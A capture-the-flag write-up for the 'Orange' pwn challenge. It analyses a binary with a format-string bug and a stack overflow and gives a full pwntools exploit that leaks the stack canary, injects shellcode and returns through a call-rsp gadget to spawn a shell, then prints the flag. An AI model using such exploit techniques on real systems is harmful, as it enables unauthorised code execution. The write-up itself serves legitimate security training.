# Orange
Dive into the juicy depths of this challenge and see if you can squeeze out a surprise.

# Write Up

Before diving into any pwn challenge, it's crucial to examine the security mitigations applied during the compilation of the executable. The checksec tool from the pwntools suite is perfect for this:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
As the output shows, the only active mitigation is stack canary. This mitigation works by placing a special value on the stack and checking it before returning from a function to ensure that a buffer overflow has not corrupted the stack.

Running the executable reveals that the program prompts the user to enter a name, which it stores as "Buyer Name." The program then displays an Orange Shop menu with various options:

```
Enter your name: Amir

===== Orange Shop Menu =====
1. Show Cart
2. Show Balance
3. Buy Oranges
4. Checkout
5. Change Buyer Name
6. Exit
============================
Enter your choice:
```

Without access to the source code, we need to use a disassembler like IDA Pro to analyze the program's behavior in detail. Through this analysis, we identify two critical vulnerabilities:

- Stack Buffer Overflow in the set_buyer_name function.
- Format String Vulnerability in the show_cart function.
Here are the relevant code snippets:

```c
int __fastcall show_cart(__int64 a1)
{
  if ( !*a1 )
    return puts("Your cart is empty.");
  printf("Buyer: ");
  printf((a1 + 16));  // Vulnerable: format string
  printf("\nYou have %d oranges in your cart.\n", *a1);
  return printf("Total: $%.2f\n", *(a1 + 8));
}

unsigned __int64 __fastcall set_buyer_name(__int64 a1)
{
  char src[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Enter your name: ");
  __isoc99_scanf("%s", src); // Vulnerable: stack bof
  strcpy((a1 + 16), src); // Vulnerable: stack bof
  return v3 - __readfsqword(0x28u);
}
```

Given the vulnerabilities and the active mitigations, the next step is to devise an exploitation strategy. The key observations are:
- Executable Stack: The stack is executable, meaning we can inject and run shellcode from the stack.
- Stack Canary: The stack canary must be bypassed to successfully exploit the stack buffer overflow.

To bypass the stack canary, we can exploit the format string vulnerability. This vulnerability allows us to read from the stack, enabling us to leak the canary value. Once we have the canary, we can craft an exploit payload that preserves the canary while overwriting the return address to execute our shellcode.

To control the execution flow, we need to identify suitable Return-Oriented Programming (ROP) gadgets. Using the ROPgadget tool, we find the following useful gadget:

```
0x0000000000401225 : pop r8 ; pop r9 ; pop r10 ; pop r11 ; call rsp
```

This gadget ends with a call rsp instruction, which is ideal for redirecting the program's execution flow to our shellcode on the stack.

With the canary leaked and the ROP chain prepared, the final step is to execute the exploit. Here's the exploit code:
```python
from pwn import *

#context.log_level = 'debug'

elf = context.binary = ELF("./orange")
libc = elf.libc

gs = '''
bp main
continue
'''
def start():
    global gs
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.0.0.0", 5001)
    else:
        return process(elf.path)


def change_name(name:bytes):
    io.sendline("5")
    io.recvuntil(b'Enter your name:')
    io.sendline(name)

def buy_orange(count:int):
    io.sendline("3")
    io.recvuntil(b'Enter the number of oranges you want to buy:')
    io.sendline(str(count).encode())


def show_card():
    io.sendline("1")
    res = io.recvline()
    return res

def initial_name():
    io.recvuntil(b"name:")
    payload = f'%{17}$p'
    io.sendline(payload)

def exit_prog():
    io.sendline("6")

# comment: Find canary offset by fmt string
# for i in range(0, 50):
#     io = start()

#     initial_name()

#     io.recvuntil(b'choice:')
#     buy_orange(1)
#     io.recvuntil(b'choice:')
#     print(f'{i} - ', end='')
#     show_card()

#     sleep(1)

# Leak canary
io = start()
initial_name()
io.recvuntil(b'choice:')
buy_orange(1)
io.recvuntil(b'choice:')
canary = show_card().decode()
canary = int(canary.replace("Buyer: ","").replace("\n",""), 16)

print(f"Canary: {hex(canary)}")

shellcode = asm(shellcraft.amd64.linux.sh())

# Overwrite RIP
payload = shellcode
payload+= b'A' * (104 - len(payload))
payload+= p64(canary)
payload+= b'B' * 8
payload+= p64(0x0000000000401225)

change_name(payload)

io.interactive()
```

# Flag

`UCTF{G1l4n_0r4nge5_4r3_V3ry_d3l1c1ous}`

# Categories

- [ ] Web
- [ ] Reverse
- [X] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Blockchain
- [ ] Steganography
- [ ] AI

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      |       350       | 500  |
